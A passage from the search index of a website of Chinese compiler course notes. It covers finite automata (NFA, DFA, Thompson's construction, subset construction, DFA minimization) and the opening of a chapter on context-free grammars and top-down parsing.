\u63a5\u6536\uff08\u6216\u5b9a\u4e49\uff09\u7684\u8bed\u8a00\uff0c\u8bb0\u4e3a \\(L(M)\\)</li> <li>\u4ee5\u4e0a\u4e00\u4e2a\u56fe\u4e3a\u4f8b\uff0c\\(L(M)\\) =  \u6240\u6709\u4ee5 \\(abb\\) \u7ed3\u5c3e\u7684\u5b57\u6bcd\u8868 \\(\\{a, b\\}\\) \u4e0a\u7684\u4e32\u7684\u96c6\u5408</li> </ul> <p>\u72b6\u6001\u8f6c\u6362: Epsilon Moves</p> <ul> <li>\\(\\epsilon - \\text{moves}\\): \u4e00\u79cd\u7279\u6b8a\u7684\u72b6\u6001\u8f6c\u6362\u65b9\u5f0f (\u81ea\u52a8\u673a\u53ef\u4ee5\u4e0d\u8bfb\u5165\u4efb\u4f55\u8f93\u5165\uff0c\u800c\u4ece\u72b6\u6001 A \u8f6c\u79fb\u5230\u72b6\u6001 B)</li> <li>e.g. </li> </ul>"}, {"location": "Course/cp/lexical/#nfa", "title": "\u975e\u786e\u5b9a\u6709\u7a77\u81ea\u52a8\u673a | NFA", "text": "<p>\u975e\u786e\u5b9a\u6709\u7a77\u81ea\u52a8\u673a (Nondeterministic finite automata, NFA) </p> \\[M = (S, \\sum, move, s_0, F)\\] <ol> <li>\\(\\sum\\) : \u8f93\u5165\u5b57\u7b26\u96c6\u5408 / \u5b57\u6bcd\u8868, \u5047\u8bbe \\(\\epsilon \\notin \\sum\\)</li> <li>\\(move\\): \\(S \\times (\\sum \\cup \\{\\epsilon\\}) \\rightarrow P(S)\\). \\(move(s, a)\\) \u8868\u793a\u4ece\u72b6\u6001 \\(s\\) \u51fa\u53d1\uff0c\u6cbf\u7740\u6807\u8bb0\u4e3a \\(a\\) \u7684\u8fb9\u6240\u80fd\u5230\u8fbe\u7684 \u72b6\u6001\u96c6\u5408</li> </ol> <ul> <li>\u5728\u72b6\u6001 \\(s\\) \u65f6\u8bfb\u5165a, \u53ef\u80fd\u8fc1\u79fb\u5230 \u591a\u4e2a\u4e0d\u540c\u7684\u72b6\u6001</li> <li>\u53ef\u80fd\u6709 \\(\\epsilon - \\text{moves}\\) (\u4e0d\u8bfb\u5165\u4efb\u4f55\u8f93\u5165\u800c\u8fc1\u79fb\u5230\u5176\u4ed6\u72b6\u6001)</li> </ul>"}, {"location": "Course/cp/lexical/#dfa", "title": "\u786e\u5b9a\u6709\u7a77\u81ea\u52a8\u673a | DFA", "text": "<p>\u786e\u5b9a\u6027\u6709\u7a77\u81ea\u52a8\u673a (Deterministic finite automata, DFA)</p> \\[M = (S, \\sum, move, s_0, F)\\] <ol> <li>\\(\\sum\\) : \u8f93\u5165\u5b57\u7b26\u96c6\u5408 / \u5b57\u6bcd\u8868, \u5047\u8bbe \\(\\epsilon \\notin \\sum\\)</li> <li>\\(move\\): \\(S \\times \\sum \\rightarrow S\\). \\(\\delta (s, a)\\) \u8868\u793a\u4ece\u72b6\u6001 \\(s\\) \u51fa\u53d1\uff0c\u6cbf\u7740\u6807\u8bb0\u4e3a \\(a\\) \u7684\u8fb9\u6240\u80fd\u5230\u8fbe\u7684 \u72b6\u6001</li> </ol> <ul> <li>\u5728\u72b6\u6001 \\(s\\) \u65f6\u8bfb\u5165a, \u53ea\u80fd\u8fc1\u79fb\u5230 \u4e00\u4e2a\u786e\u5b9a\u7684\u72b6\u6001</li> <li>\u6ca1\u6709 \\(\\epsilon - \\text{moves}\\)</li> </ul> <p>NFA vs. DFA vs. RE</p> <ul> <li>DFA \u548c NFA \u4e3b\u8981\u5dee\u5f02\u5728\u8f6c\u6362\u51fd\u6570</li> <li>DFA \u548c NFA \u7684\u7b49\u4ef7\u6027:<ul> <li>\u5bf9\u4efb\u4f55NFA \\(N\\) \uff0c\u5b58\u5728\u5b9a\u4e49\u540c\u4e00\u8bed\u8a00\u7684DFA \\(D\\)</li> <li>\u5bf9\u4efb\u4f55DFA \\(D\\) \uff0c\u5b58\u5728\u5b9a\u4e49\u540c\u4e00\u8bed\u8a00\u7684NFA \\(N\\)</li> </ul> </li> <li>RE \\(\\Leftrightarrow\\) DFA \\(\\Leftrightarrow\\) NFA: <ul> <li>\u5bf9\u4efb\u4f55 NFA, \u5b58\u5728\u5b9a\u4e49\u540c\u4e00(\u6b63\u5219)\u8bed\u8a00\u7684 DFA</li> <li>\u5bf9\u4efb\u4f55 DFA, \u5b58\u5728\u5b9a\u4e49\u540c\u4e00(\u6b63\u5219)\u8bed\u8a00\u7684 NFA </li> </ul> </li> </ul> <p>\u8bcd\u6cd5\u5206\u6790: \u5982\u4f55\u6784\u9020 \\(FA\\), \u6765\u8bc6\u522b\u7528 RE \u523b\u753b\u7684 Token?</p>"}, {"location": "Course/cp/lexical/#_5", "title": "\u8bc6\u522b\u5b57\u7b26\u4e32", "text": "<p>\u6784\u9020 NFA \u8bc6\u522b\u5b57\u7b26\u4e32\uff1a</p> <p></p> <p>\u6784\u9020 DFA \u8bc6\u522b\u5b57\u7b26\u4e32</p> <ul> <li>\u8f93\u5165\uff1a\u4ee5\u6587\u4ef6\u7ed3\u675f\u7b26 <code>eof</code> \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32 \\(x\\)</li> <li>DFA \\(D\\): \u5f00\u59cb\u72b6\u6001 \\(s_0\\)\uff0c\u63a5\u6536\u72b6\u6001\u96c6 \\(F\\)\uff0c\u8f6c\u6362\u51fd\u6570 \\(move\\)</li> <li>\u8f93\u51fa\uff1a\u5982\u679c \\(D\\) \u63a5\u6536 \\(x\\)\uff0c\u5219\u56de\u7b54 \u201cyes\u201d\uff0c\u5426\u5219\u56de\u7b54 \u201cno\u201d</li> </ul> <pre><code>s = s_0;\nc = nextChar();\nwhile (c != eof) {\n    s = move(s, c);\n    c = nextChar();\n}\nif s in F then return \"yes\"\nelse return \"no\"\n</code></pre> <ul> <li><code>nextChar()</code> \u8fd4\u56de \\(x\\) \u7684\u4e0b\u4e00\u4e2a\u5b57\u7b26</li> <li><code>move(s, c)</code> \u8fd4\u56de\u4ece\u72b6\u6001 \\(s\\) \u8bfb\u5165\u5b57\u7b26 \\(c\\) \u540e\u80fd\u5230\u8fbe\u7684\u72b6\u6001</li> </ul>"}, {"location": "Course/cp/lexical/#_6", "title": "\u8bcd\u6cd5\u5206\u6790\u5668\u81ea\u52a8\u751f\u6210", "text": "<p>\u4ece RE \u5230 FA</p> <ol> <li>\\(RE \\rightarrow NFA\\)</li> <li>\\(NFA \\rightarrow DFA\\) (\u5b50\u96c6\u6784\u9020\u6cd5)</li> <li>\\(DFA\\) \u7b80\u5316</li> </ol>"}, {"location": "Course/cp/lexical/#re-nfa", "title": "RE -&gt; NFA", "text": "<ul> <li>\u8f93\u5165: \u6b63\u5219\u8868\u8fbe\u5f0f \\(r\\)</li> <li> <p>\u8f93\u51fa: \u5b9a\u4e49\u5b83\u7684 NFA, \u8bb0\u4e3a \\(N(r)\\)</p> </li> <li> <p>Thompson \u7b97\u6cd5: \u57fa\u4e8e\u5bf9 RE \u7684\u7ed3\u6784\u505a\u5f52\u7eb3</p> <ul> <li>\u5bf9\u57fa\u672c\u7684 RE \u76f4\u63a5\u6784\u9020\uff1a\\(\\epsilon, a\\)</li> <li>\u5bf9\u590d\u5408\u7684 RE \u9012\u5f52\u6784\u9020: \\(st, s|t, s^*\\)</li> <li>\\(N(r)\\) \u4ec5\u4e00\u4e2a\u63a5\u53d7\u72b6\u6001\uff0c\u4e14\u6ca1\u6709\u51fa\u8fb9</li> </ul> </li> </ul> <p>1) \u5904\u7406 epsilon \u548c a</p> <p>\u76f4\u63a5\u6784\u9020\uff1a\u8bc6\u522b \\(\\epsilon\\) \u548c\u5b57\u6bcd\u8868\u4e2d\u4e00\u4e2a\u7b26\u53f7 \\(a\\) \u7684 NFA</p> <p></p> <p>2) \u5904\u7406 s|t</p> <p>\u9012\u5f52\u6784\u9020\uff1a\u9009\u62e9 \\(s | t\\)</p> <p></p> <p>3) \u5904\u7406 st</p> <p>\u9012\u5f52\u6784\u9020\uff1a\u8fde\u63a5 \\(st\\)</p> <p></p> <p>4) \u5904\u7406 s<sup>*</sup></p> <p>\u9012\u5f52\u6784\u9020\uff1a\u95ed\u5305 \\(s^*\\)</p> <p></p> Example <p></p>"}, {"location": "Course/cp/lexical/#nfa-dfa", "title": "NFA -&gt; DFA (\u5b50\u96c6\u6784\u9020\u6cd5)", "text": "<p>1) \u5b50\u96c6\u6784\u9020\u6cd5 (subset construction) \u539f\u5219:</p> <ul> <li>DFA \u7684\u6bcf\u4e2a\u72b6\u6001\u662f NFA \u7684\u72b6\u6001\u96c6\u5408\u7684\u4e00\u4e2a\u5b50\u96c6</li> <li>\u8bfb\u4e86\u8f93\u5165 \\(a_i\\) \u540e NFA \u80fd\u5230\u8fbe\u7684\u6240\u6709\u72b6\u6001\uff1a\\(s_1, s_2, \\dots, s_k\\), \u5219 DFA \u5230\u8fbe\u4e00\u4e2a\u72b6\u6001\uff0c\u5bf9\u5e94\u4e8e NFA \u7684\u72b6\u6001\u96c6\u5408 \\(\\{s_1, s_2, \\dots, s_k\\}\\) \u7684\u5b50\u96c6</li> </ul> <p>2) \u5b9a\u4e49 NFA \u72b6\u6001(\u96c6)\u4e0a\u7684\u4e00\u4e9b\u64cd\u4f5c\uff1a</p> \u64cd\u4f5c \u63cf\u8ff0 \\(\\epsilon - closure(s)\\) NFA \u72b6\u6001 \\(s\\) \u7684 \\(\\epsilon\\) -\u95ed\u5305, \\(s\\) \u7ecf \\(\\epsilon\\) \u8f6c\u6362\u6240\u80fd\u5230\u8fbe\u7684\u72b6\u6001\u96c6\u5408 \\(\\epsilon - closure(T)\\) \\(T\\) \u4e2d\u6240\u6709\u72b6\u6001\u7684 \\(\\epsilon\\) -\u95ed\u5305\u7684\u5e76\u96c6\uff0c\u5373 \\(\\bigcup_{s \\in T} \\epsilon-closure(s)\\) <p>\\(T\\) \u662f NFA \u7684\u72b6\u6001\u96c6\u5408\u7684\u5b50\u96c6</p> <p>3) \u5b50\u96c6\u6784\u9020\u6cd5\u7684\u6b65\u9aa4\uff1a</p> <ol> <li>NFA \u7684\u521d\u59cb\u72b6\u6001\u7684 \\(\\epsilon\\) -\u95ed\u5305\u5bf9\u5e94\u4e8e DFA \u7684\u521d\u59cb\u72b6\u6001</li> <li>\u9488\u5bf9\u6bcf\u4e2a DFA \u72b6\u6001 (\u5bf9\u5e94 NFA \u72b6\u6001\u5b50\u96c6 \\(A\\) ), \u6c42\u8f93\u5165\u6bcf\u4e2a \\(a_i\\) \u540e\u80fd\u5230\u8fbe\u7684 NFA \u72b6\u6001\u7684 \\(\\epsilon\\) -\u95ed\u5305\u5e76\u96c6</li> </ol> \\[S = \\epsilon-closure(move(A, a_i))\\] <ul> <li>\u8be5\u96c6\u5408 \\(S\\) \u5bf9\u5e94 DFA \u4e2d\u7684\u4e00\u4e2a\u5df2\u6709\u72b6\u6001\u6216\u4e00\u4e2a\u8981\u65b0\u52a0\u7684\u72b6\u6001</li> <li>\u7531\u6b64\u9010\u6b65\u6784\u9020 DFA \u7684\u72b6\u6001\u8f6c\u6362\u8868\uff0c\u76f4\u5230\u4e0d\u52a8\u70b9</li> </ul> Example <p></p>"}, {"location": "Course/cp/lexical/#dfa_1", "title": "DFA \u7b80\u5316", "text": "<p>DFA \u72b6\u6001\u6570\u91cf\u7684\u6700\u5c0f\u5316:</p> <ol> <li>\u4e00\u4e2a\u6b63\u5219\u8bed\u8a00\u53ef\u5bf9\u5e94\u4e8e\u591a\u4e2a\u8bc6\u522b\u6b64\u8bed\u8a00\u7684 DFA</li> <li>\u901a\u8fc7 DFA \u7684\u6700\u5c0f\u5316\u53ef\u5f97\u5230\u72b6\u6001\u6570\u91cf\u6700\u5c11\u7684 DFA (\u4e0d\u8ba1\u540c\u6784\uff0c\u8fd9\u6837\u7684 DFA \u662f\u552f\u4e00\u7684)</li> </ol> <p>\u53ef\u533a\u5206\u7684\u72b6\u6001 (Distinguishable States)</p> <p>\u5982\u679c\u5b58\u5728\u4e32 \\(x\\)\uff0c\u4f7f\u5f97\u4ece \\(s\\), \\(t\\) \u51fa\u53d1\uff0c\u4e00\u4e2a\u5230\u8fbe \u63a5\u53d7\u72b6\u6001\uff0c\u4e00\u4e2a\u5230\u8fbe \u975e\u63a5\u53d7\u72b6\u6001\uff0c\u90a3\u4e48 \\(x\\) \u5c31\u533a\u5206\u4e86 \\(s\\) \u548c \\(t\\)</p> <p></p>"}, {"location": "Course/cp/lexical/#dfa_2", "title": "DFA \u6700\u5c0f\u5316\u7b97\u6cd5", "text": "<ul> <li>(\u63a8\u8bba) DFA\u72b6\u6001\u7b49\u4ef7\u7684\u6761\u4ef6:<ul> <li>\u4e00\u81f4\u6027\u6761\u4ef6 : \\(s\\), \\(t\\) \u540c\u4e3a\u7ec8\u6001\u6216\u975e\u7ec8\u6001</li> <li>\u8513\u5ef6\u6027\u6761\u4ef6 : \u5bf9\u6240\u6709\u8f93\u5165\u7b26\u53f7, \\(s\\), \\(t\\) \u5fc5\u987b\u8f6c\u6362\u5230\u7b49\u4ef7\u7684\u72b6\u6001\u96c6\u4e2d\uff0c\u540c\u65f6\u5177\u6709\u4f20\u9012\u6027</li> </ul> </li> <li>DFA \u7b80\u5316\u7b97\u6cd5<ul> <li>\u5212\u5206\u90e8\u5206: \u6839\u636e\u4ee5\u4e0a\u6761\u4ef6\u8fed\u4ee3\u5f0f\u5212\u5206\u7b49\u4ef7\u7c7b,</li> <li>\u6784\u9020\u90e8\u5206: \u4ece\u5212\u5206\u5f97\u5230\u7684\u7b49\u4ef7\u7c7b\u4e2d\u9009\u53d6\u4ee3\u8868\uff0c\u5e76\u91cd\u5efa DFA</li> </ul> </li> </ul> <p>1) DFA\u6700\u5c0f\u5316\u7b97\u6cd5 (\u5212\u5206\u90e8\u5206)</p> <ol> <li>\u521d\u59cb\u5316\u5206\uff1a\u5212\u5206\u4e3a\u63a5\u53d7\u72b6\u6001\u7ec4\u548c\u975e\u63a5\u53d7\u72b6\u6001\u7ec4 \\(\\prod = \\{S - F, F\\}\\)</li> <li>\u8fed\u4ee3\uff0c\u7ee7\u7eed\u5212\u5206</li> </ol> <p></p> <ol> <li>\u5982\u679c \\(\\prod_{\\text{new}}\\) == \\(\\prod\\) \u76f8\u7b49\uff0c\u505c\u6b62\u8fed\u4ee3\uff0c\u4ee4 \\(\\prod_{\\text{final}} = \\prod\\)\uff1b\u5426\u5219\uff0c\u66f4\u65b0 \\(\\prod = \\prod_{\\text{new}}\\)\uff0c\u8f6c\u5230\u6b65\u9aa4 2</li> </ol> <p>2) DFA\u6700\u5c0f\u5316\u7b97\u6cd5 (\u6784\u9020\u90e8\u5206)</p> <p>\u5728 \\(\\prod_{\\text{final}}\\) \u4e2d\u9009\u62e9\u4e00\u4e2a\u72b6\u6001\u4f5c\u4ee3\u8868\uff0c\u4f5c\u4e3a\u6700\u5c0f\u5316 DFA \u4e2d\u7684\u72b6\u6001</p> <ul> <li>\u5f00\u59cb\u72b6\u6001\uff1a\u5305\u542b\u539f\u5f00\u59cb\u72b6\u6001\u7684\u7ec4\u7684\u4ee3\u8868</li> <li>\u63a5\u53d7\u72b6\u6001\uff1a\u5305\u542b\u4e86\u539f\u63a5\u53d7\u72b6\u6001\u7684\u7ec4\u7684\u4ee3\u8868\uff08\u8fd9\u4e2a\u7ec4\u4e00\u5b9a\u53ea\u5305\u542b\u63a5\u53d7\u72b6\u6001\uff09</li> <li>\u8f6c\u6362\u5173\u7cfb\u6784\u9020\u4e3a\uff1a\u5982\u679c \\(s\\) \u662f \\(G\\) \u7684\u4ee3\u8868\uff0c\u800c\u539f DFA \u4e2d \\(s\\) \u5728 \\(a\\) \u4e0a\u7684\u8f6c\u6362\u5230\u8fbe \\(t\\), \u4e14 \\(t\\) \u6240\u5728\u7ec4\u7684\u4ee3\u8868\u4e3a \\(r\\)\uff0c\u90a3\u4e48\u6700\u5c0f\u5316 DFA \u4e2d\u6709\u4ece \\(s\\) \u5230 \\(r\\) \u7684\u5728 \\(a\\) \u4e0a\u7684\u8f6c\u6362</li> </ul> DFA \u7684\u5316\u7b80 <p></p> More <ul> <li>\u8ba1\u7b97 \\(\\epsilon-closure(T)\\) : \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u56fe\u641c\u7d22\u8fc7\u7a0b (\u5982\u679c\u53ea\u8003\u8651 \\(\\epsilon\\) \u8fb9) </li> <li>NFA -&gt; DFA (\u5b50\u96c6\u6784\u9020\u6cd5)\uff1a\u6574\u4e2a\u7b97\u6cd5\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u641c\u7d22\u8fc7\u7a0b</li> </ul> <p>\\(D\\) states \u4e2d\u7684\u4e00\u4e2a\u72b6\u6001\u672a\u52a0\u6807\u8bb0\u8868\u793a\u8fd8\u6ca1\u6709\u641c\u7d22\u8fc7\u5b83\u7684\u5404\u4e2a\u540e\u7ee7</p> \u4e00\u4e9b\u4e60\u9898 <p>\u4e60\u9898</p> <ol> <li> <p>\u8bcd\u7d20, a member (string) of the set (token) such as \u201celse\u201d, \u201cif\u201d\u00a0\u21a9</p> </li> </ol>"}, {"location": "Course/cp/parsing1/", "title": "Parsing (Top-Down Parsing)", "text": "<p> \u7ea6 5896 \u4e2a\u5b57  60 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 20 \u5206\u949f</p> <p>Abstract</p> <ul> <li>\u672c\u8282\u4e3b\u8981\u4ecb\u7ecd\u8bed\u6cd5\u5206\u6790 (Parsing) \u548c\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 (Context-Free Grammar, CFG) \u7684\u57fa\u672c\u6982\u5ff5</li> <li>\u548c \u81ea\u9876\u5411\u4e0b\u7684\u8bed\u6cd5\u5206\u6790\u65b9\u6cd5</li> </ul>"}, {"location": "Course/cp/parsing1/#context-free-grammar", "title": "\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 | Context-Free Grammar", "text": "<p>Note</p> <p>CFG \u662f\u4e00\u79cd\u5f62\u5f0f\u6587\u6cd5\uff0c\u7528\u4e8e\u63cf\u8ff0\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00 (Context-Free Language) \u7684\u8bed\u6cd5\u7ed3\u6784.</p>"}, {"location": "Course/cp/parsing1/#cfg", "title": "CFG \u7b80\u4ecb", "text": "<p>\u95ee\u9898: \u5982\u4f55\u5f62\u5f0f\u5316\u5b9a\u4e49\u7f16\u7a0b\u8bed\u8a00\u7684\u8bed\u6cd5\uff1f</p> <p>\u8bed\u6cd5\u5206\u6790\u7684\u76ee\u7684\u662f\u6559\u4f1a\u8ba1\u7b97\u673a\u5224\u65ad\u8f93\u5165\u5408\u6cd5\u6027</p> <p>\u4f8b\uff1a\u7b80\u5355\u8ba1\u7b97\u5668\u7a0b\u5e8f</p> <pre><code>1 + 2 - 3 +     \u975e\u6cd5\n1 + 2 - a       \u975e\u6cd5\n1 + (2 - 3)     \u5408\u6cd5\n1 2 + - 3       \u975e\u6cd5\n</code></pre> <p>\u5982\u4f55\u5224\u5b9a\u8f93\u5165\u5408\u6cd5\u6027 &amp; \u751f\u6210\u8bed\u6cd5\u6811</p> <ul> <li>\u9996\u5148\u89c4\u5b9a\u597d\u5408\u6cd5\u7684\u57fa\u672c\u5355\u5143 (Token) \u2014\u2014 \u8bcd\u6cd5\u5206\u6790</li> <li>\u5176\u6b21\u8981\u7406\u89e3\u7b97\u672f\u8868\u8fbe\u5f0f\u7684\u6784\u6210<ul> <li>\u5927\u8868\u8fbe\u5f0f\u53ef\u62c6\u5206\u4e3a\u5b50\u8868\u8fbe\u5f0f</li> <li>\u62c6\u89e3\u8fc7\u7a0b\u662f\u9012\u5f52\u7684\uff0c\u76f4\u81f3\u770b\u5230\u57fa\u672c\u5355\u5143</li> </ul> </li> </ul> <p></p> <p>\u5982\u4f55\u6784\u9020\u7f16\u7a0b\u8bed\u8a00\u7684\u8bed\u6cd5\u5206\u6790\u5668</p> <ul> <li>\u7528 CFG \u5b9a\u4e49\u4e00\u4e2a\u7f16\u7a0b\u8bed\u8a00\u7684\u8bed\u6cd5</li> <li>\u57fa\u4e8e CFG \u6784\u5efa\u89e3\u6790\u5668:<ul> <li>Top-Down Parsing | \u81ea\u9876\u5411\u4e0b\u7684\u8bed\u6cd5\u5206\u6790</li> <li>Bottom-Up Parsing | \u81ea\u5e95\u5411\u4e0a\u7684\u8bed\u6cd5\u5206\u6790</li> </ul> </li> <li>More about parsing:<ul> <li>Automatic paraser generation</li> <li>Error recovery</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing1/#cfg_1", "title": "CFG \u7684\u5b9a\u4e49", "text": "<p>\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5: \u63cf\u8ff0\u8bed\u8a00\u7684\u8bed\u6cd5\u7ed3\u6784</p> \\[G = (T, N, P, S)\\] <ul> <li>\\(T\\): \u7ec8\u7ed3\u7b26\u96c6\u5408 (Terminals), \u7ec4\u6210\u4e32\u7684\u57fa\u672c\u7b26\u53f7 (Token)<ul> <li>\u4f8b\uff1a\\(T = \\{\\text{num}, +, -, (, )\\}\\)</li> </ul> </li> <li>\\(N\\): \u975e\u7ec8\u7ed3\u7b26\u96c6\u5408 (Non-terminals), \u8868\u793a\u4e32\u7684\u96c6\u5408\u7684\u8bed\u6cd5\u53d8\u91cf (\u5728\u7a0b\u5e8f\u8bed\u8a00\u4e2d\u901a\u5e38\u5bf9\u5e94\u4e8e\u67d0\u4e2a\u7a0b\u5e8f\u6784\u9020)<ul> <li>\u4f8b\uff1a\\(N = \\{\\text{expr}, \\text{term}, \\text{stmt}\\}\\)</li> </ul> </li> <li>\\(P\\): \u4ea7\u751f\u5f0f\u96c6\u5408 (Productions), \\(A \\rightarrow a\\), \\(A \\in N\\), \\(a \\in (T \\cup N)^*\\)<ul> <li>\u5934(\u5de6)\u90e8 \\(A\\) \u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u53f3\u90e8 \\(a\\) \u662f\u4e00\u4e2a\u7b26\u53f7\u4e32</li> <li>\u63cf\u8ff0\u4e86\u4e00\u4e2a\u5c06\u7ec8\u7ed3\u7b26\u548c\u975e\u7ec8\u7ed3\u7b26\u7ec4\u5408\u6210\u4e32\u7684\u65b9\u6cd5</li> <li>e.g. \\(E \\rightarrow E + E\\), \\(E \\rightarrow (E)\\), \\(E \\rightarrow \\text{id}\\)</li> </ul> </li> <li>\\(S\\): \u5f00\u59cb\u7b26\u53f7 (Start symbol), \\(S \\in N\\)<ul> <li>\u67d0\u4e2a\u88ab\u6307\u5b9a\u7684\u975e\u7ec8\u7ed3\u7b26\u53f7</li> <li>\u5b83\u5bf9\u5e94\u7684\u4e32\u7684\u96c6\u5408\u5c31\u662f\u6587\u6cd5\u7684\u8bed\u8a00</li> </ul> </li> </ul> <ul> <li>\\(T \\cap N = \\emptyset\\)</li> <li>\\(T \\cup N\\) : \u6587\u6cd5\u7b26\u53f7\u96c6</li> </ul> <p>EOF Marker</p> <ul> <li><code>$</code>: end of file (EOF)</li> <li>To indicate that <code>$</code> must come after a complete \\(S\\) -phrase<ul> <li>add a new start symbol \\(S'\\) and a new production \\(S' \\rightarrow S\\$\\)</li> </ul> </li> </ul>"}, {"location": "Course/cp/parsing1/#_1", "title": "\u4ea7\u751f\u5f0f\u7684\u7f29\u5199", "text": "<p>\u5bf9\u4e00\u7ec4\u6709\u76f8\u540c\u5de6\u90e8\u7684 \\(\\alpha\\) \u4ea7\u751f\u5f0f</p> \\[\\alpha \\rightarrow \\beta_1, \\dots, \\alpha \\rightarrow \\beta_n\\] <p>\u53ef\u4ee5\u7b80\u8bb0\u4e3a\uff1a</p> \\[\\alpha \\rightarrow \\beta_1 \\vert \\dots \\vert \\beta_n\\] <ul> <li>\u8bfb\u4f5c\uff1a\\(\\alpha\\) \u5b9a\u4e49\u4e3a \\(\\beta_1\\) \u6216 \\(\\dots\\) \u6216 \\(\\beta_n\\)</li> <li>\\(\\beta_1, \\dots, \\beta_n\\) \u79f0\u4e3a \\(\\alpha\\) \u7684\u5019\u9009\u5f0f (Candidate)</li> </ul>"}, {"location": "Course/cp/parsing1/#_2", "title": "\u63a8\u5bfc\u548c\u5f52\u7ea6", "text": "<p>\u95ee\u9898\uff1a\u7ed9\u5b9a\u6587\u6cd5\uff0c\u5982\u4f55\u5224\u5b9a\u8f93\u5165\u4e32\u5c5e\u4e8e\u6587\u6cd5\u89c4\u5b9a\u7684\u8bed\u8a00?</p> <p>\u63a8\u5bfc (Derivations) \u548c\u5f52\u7ea6 (Reductions)</p> \\[\\text{\u7ed9\u5b9a\u6587\u6cd5}~ G=(T, N, P, S)\\] <ul> <li>\u76f4\u63a5\u63a8\u5bfc\uff1a\u628a\u4ea7\u751f\u5f0f\u770b\u6210\u91cd\u5199\u89c4\u5219\uff0c\u628a\u7b26\u53f7\u4e32\u4e2d\u7684\u975e\u7ec8\u7ed3\u7b26\u7528\u5176\u4ea7\u751f\u5f0f\u53f3\u90e8\u7684\u4e32\u6765\u4ee3\u66ff<ul> <li>\u5982\u679c \\(A \\rightarrow \\gamma \\in P\\), \u4e14 \\(\\alpha, \\beta \\in (T \\cup N)^*\\), \u79f0\u4e32 \\(\\alpha A \\beta\\) \u76f4\u63a5\u63a8\u5bfc\u51fa \\(\\alpha \\gamma \\beta\\), \u5e76\u8bb0\u4f5c \\(\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta\\)</li> </ul> </li> <li>\u76f4\u63a5\u5f52\u7ea6\uff1a\u5982\u679c \\(\\alpha A \\beta \\Rightarrow \\alpha \\gamma \\beta\\), \u5219\u79f0 \\(\\alpha \\gamma \\beta\\) \u76f4\u63a5\u5f52\u7ea6\u5230 \\(\\alpha A \\beta\\)</li> <li>\u591a\u6b65\u63a8\u5bfc\uff1a\u5982\u679c \\(\\alpha_0 \\Rightarrow \\alpha_1\\), \\(\\alpha_1 \\Rightarrow \\alpha_2\\), \\(\\dots\\), \\(\\alpha_{n-1} \\Rightarrow \\alpha_n\\), \u5219\u53ef\u4ee5\u8bb0\u4f5c \\(\\alpha_0 \\Rightarrow \\alpha_1 \\Rightarrow \\dots \\Rightarrow \\alpha_n\\), \u79f0\u7b26\u53f7\u4e32 \\(\\alpha_0\\) \u7ecf\u8fc7 n \u6b65\u63a8\u5bfc\u5f97\u5230 \\(\\alpha_n\\)\uff0c\u53ef\u7b80\u8bb0\u4e3a \\(\\alpha_0 \\Rightarrow^n \\alpha_n\\)<ul> <li>\\(\\Rightarrow^+\\) \u8868\u793a\u201c\u7ecf\u8fc7\u6b63\u6570\u6b65\u63a8\u5bfc\u201d</li> <li>\\(\\Rightarrow^*\\) \u8868\u793a\u201c\u7ecf\u8fc7\u96f6\u6b65\u6216\u591a\u6b65\u63a8\u5bfc\u201d</li> </ul> </li> </ul> <p>1) \u6700\u5de6\u63a8\u5bfc (Left-most Derivation)\uff1a\u6bcf\u6b65\u4ee3\u6362 \u6700\u5de6\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26</p> <p></p> <p>2) \u6700\u53f3\u63a8\u5bfc (Right-most Derivation)\uff1a\u6bcf\u6b65\u4ee3\u6362 \u6700\u53f3\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26</p> <p></p> <p>3) \u53e5\u578b\u3001\u53e5\u5b50\u548c\u8bed\u8a00</p> <ul> <li>\u53e5\u578b (Sentence Form)\uff1a\u5bf9\u5f00\u59cb\u7b26\u53f7\u4e3a \\(S\\) \u7684\u6587\u6cd5 \\(G\\), \u5982\u679c \\(S \\Rightarrow^* \\alpha\\), \\(\\alpha \\infty (T \\cup N)^*\\), \u5219\u79f0 \\(\\alpha\\) \u4e3a \\(G\\) \u7684\u4e00\u4e2a\u53e5\u578b<ul> <li>\u53e5\u578b\u4e2d\u65e2\u53ef\u4ee5\u5305\u542b\u7ec8\u7ed3\u7b26\uff0c\u53c8\u53ef\u4ee5\u5305\u542b\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e5f\u80fd\u662f\u7a7a\u4e32</li> </ul> </li> <li>\u53e5\u5b50 (Sentence)\uff1a\u5982\u679c \\(S \\Rightarrow^* w\\), \\(w \\in T^*\\), \u5219\u79f0 \\(w\\) \u4e3a \\(G\\) \u7684\u4e00\u4e2a\u53e5\u5b50<ul> <li>\u53e5\u5b50\u662f\u4e0d\u542b\u975e\u7ec8\u7ed3\u7b26\u7684\u53e5\u578b</li> </ul> </li> <li>\u8bed\u8a00 (Language)\uff1a\u7531\u6587\u6cd5 \\(G\\) \u63a8\u5bfc\u51fa\u7684\u6240\u6709\u53e5\u5b50\u6784\u6210\u7684\u96c6\u5408\uff0c\u8bb0\u4e3a \\(L(G)\\)</li> </ul> \\[L(G) = \\{w \\vert S \\Rightarrow^* w, w \\in T^*\\}\\] \u4f8b: \u6587\u6cd5\u5b9a\u4e49\u7684\u53e5\u578b\u548c\u53e5\u5b50 <ul> <li>\u8003\u8651\u6587\u6cd5\uff1a\\(E \\rightarrow E + E \\vert E * E \\vert (E) \\vert \\text{id}\\)</li> <li>\u5b58\u5728\u4e00\u4e0b\u63a8\u5bfc\u5e8f\u5217\uff1a</li> </ul> \\[E \\Rightarrow -E \\Rightarrow -(E) \\Rightarrow -(E + E) \\Rightarrow -(\\text{id} + E) \\Rightarrow -(\\text{id} + \\text{id})\\] <ul> <li>\\(-(\\text{id} + \\text{id})\\) \u662f\u6587\u6cd5\u7684\u53e5\u5b50</li> <li>\\(-(\\text{id} + E)\\) \u662f\u6587\u6cd5\u7684\u53e5\u578b</li> </ul> <p>4) \u8f93\u5165\u4e32\u7684\u5224\u5b9a</p> 